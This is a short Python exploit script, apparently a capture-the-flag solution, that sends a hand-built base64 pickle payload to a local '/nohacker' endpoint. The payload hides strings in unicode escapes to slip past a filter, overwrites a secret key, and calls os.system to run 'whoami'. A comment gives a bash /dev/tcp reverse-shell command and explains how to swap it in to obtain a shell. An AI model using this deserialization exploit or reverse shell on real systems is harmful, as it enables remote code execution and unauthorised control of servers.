import requests
import base64
url = "http://127.0.0.1:5000/nohacker"


def char2unicode(ascii):
    ''' 
    ascii: bash -c "bash -i >& /dev/tcp/ip/port 0>&1" 
    change unicode string in line 25, after the 'V' letter, with the output, then can get shell
    \u0077\u0068\u006f\u0061\u006d\u0069 -> whoami
    '''
    unicode = ''
    for i in ascii:
        unicode += '\\u' + hex(ord(i))[2:].zfill(4)
    return unicode


def solve():
    message = b'''\
c__main__
secret
(V\u0073\u0065\u0063\u0072\u0065\u0074\u004b\u0065\u0079
V\u0076\u0079\u0042\u004e\u0067\u0031\u006f\u0035\u006e\u0033\u0037\u0065\u0057\u0077\u0050\u0052
dbcbuiltins
filter
\x940(V\u0077\u0068\u006f\u0061\u006d\u0069
t\x940(cos
system
g1
t\x940g0
g2
\x81\x940cbuiltins
bytes
(g3
t\x81.'''
    # message = b'(cbuiltins\neval\n.'
    payload = {'m': base64.b64encode(message)}
    res = requests.post(url, data=payload)
    print(payload)
    print(res.text)
    
if __name__ == '__main__':
    '''
    make sure you've changed the url
    '''
    solve()
